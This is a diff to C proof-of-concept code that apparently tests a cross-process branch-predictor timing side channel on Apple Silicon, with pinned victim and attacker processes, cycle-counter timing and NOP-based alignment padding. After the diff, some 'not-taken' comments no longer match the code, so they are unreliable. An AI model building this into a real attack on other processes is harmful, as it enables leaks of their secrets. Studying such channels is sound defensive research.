@@ -32,12 +32,15 @@ void f1(int input){
     }
 }
 
-void f2(int input){
+void dummy(){
     __asm__ __volatile__(
-    ".rept 15\n\t"
+    ".rept 7191\n\t"
     "nop\n\t"
     ".endr\n\t"
     :::);
+}
+
+void f2(int input){
 	if (input){
 		__asm__ __volatile__(
         ".rept 8000\n\t"
@@ -61,24 +64,24 @@ int check_conjuring(){
     uint64_t *miss = (uint64_t *)malloc(sizeof(uint64_t) * testsize);
 
     for (int i = 0; i < testsize; i++) {
-        f1(0);
-        asm volatile("mrs %[t1], S3_2_c15_c0_0" : [t1]"=r"(t1));
-        asm volatile("dsb sy" ::: "memory");
-        f1(0); // not-taken
-        asm volatile("dsb sy" ::: "memory");
-        asm volatile("mrs %[t2], S3_2_c15_c0_0" : [t2]"=r"(t2));
-        hit[i] = t2 - t1;
-        printf("[HIT]  Time (ns): %llu\n", hit[i]);
-    }
-    for (int i = 0; i < testsize; i++) {
         f1(1);
         asm volatile("mrs %[t1], S3_2_c15_c0_0" : [t1]"=r"(t1));
         asm volatile("dsb sy" ::: "memory");
-        f1(0); // not-taken
+        f1(1); // not-taken
+        asm volatile("dsb sy" ::: "memory");
+        asm volatile("mrs %[t2], S3_2_c15_c0_0" : [t2]"=r"(t2));
+        hit[i] = t2 - t1;
+        printf("[HIT]  Time (cycle): %llu\n", hit[i]);
+    }
+    for (int i = 0; i < testsize; i++) {
+        f1(0);
+        asm volatile("mrs %[t1], S3_2_c15_c0_0" : [t1]"=r"(t1));
+        asm volatile("dsb sy" ::: "memory");
+        f1(1); // not-taken
         asm volatile("dsb sy" ::: "memory");
         asm volatile("mrs %[t2], S3_2_c15_c0_0" : [t2]"=r"(t2));
         miss[i] = t2 - t1;
-        printf("[MISS] Time (ns): %llu\n", miss[i]);
+        printf("[MISS] Time (cycle): %llu\n", miss[i]);
     }
 
     print_histogram(hit, testsize, "HIT");
@@ -106,6 +109,7 @@ int main() {
     } 
     else if (pid == 0) {
         // Child = Victim
+        // CORE_ID = 0;
         volatile uint32_t ret = sysctlbyname("kern.sched_thread_bind_cpu", NULL, NULL, &CORE_ID, sizeof(uint32_t));
         if (ret == -1)
         {
@@ -132,7 +136,7 @@ int main() {
             usleep(10);
             int input = rand() % 2;
 
-            f1(1);
+            f1(0); // victim branch
             asm volatile("dsb sy" ::: "memory");
             asm volatile("mrs %[now], S3_2_c15_c0_0" : [now]"=r"(now));
             // fprintf(fp, "%llu\n", now);
@@ -171,7 +175,7 @@ int main() {
         while(1) {		
             asm volatile("mrs %[t1], S3_2_c15_c0_0" : [t1]"=r"(t1));
             asm volatile("dsb sy" ::: "memory");
-            f2(0); // not-taken
+            f2(1); // attacker branch
             asm volatile("dsb sy" ::: "memory");
             asm volatile("mrs %[t2], S3_2_c15_c0_0" : [t2]"=r"(t2));
             latency = t2 - t1;
